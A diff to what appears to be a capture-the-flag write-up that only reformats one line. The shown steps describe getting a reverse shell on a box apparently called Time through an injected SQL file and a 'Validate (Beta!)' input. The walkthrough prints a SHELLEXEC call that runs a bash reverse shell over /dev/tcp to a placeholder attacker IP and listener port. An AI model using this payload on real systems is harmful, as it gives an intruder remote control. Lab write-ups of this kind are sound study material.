@@ -50,7 +50,7 @@ priority: 2
 
 > **In simple steps:**
 1. Add inject.sql file to your machine.
-2. Get ready your bash shell execution for the reverse shell [(CALL SHELLEXEC('bash -i &>/dev/tcp/YOUR_MACHINE_IP/YOUR_NC_LISTNER_PORT 0>&1 &'))].
+2. Get ready your bash shell execution for the reverse shell ```(CALL SHELLEXEC('bash -i &>/dev/tcp/YOUR_MACHINE_IP/YOUR_NC_LISTNER_PORT 0>&1 &'))```.
 3. Fired up your http server for port 8000 to upload inject.sql for our attacking box (Time).
 4. Make your listner ready for the reverse shell.
 5. Use the POC payload with YOUR_MACHINE_IP on port 8000 in Validate (Beta!).
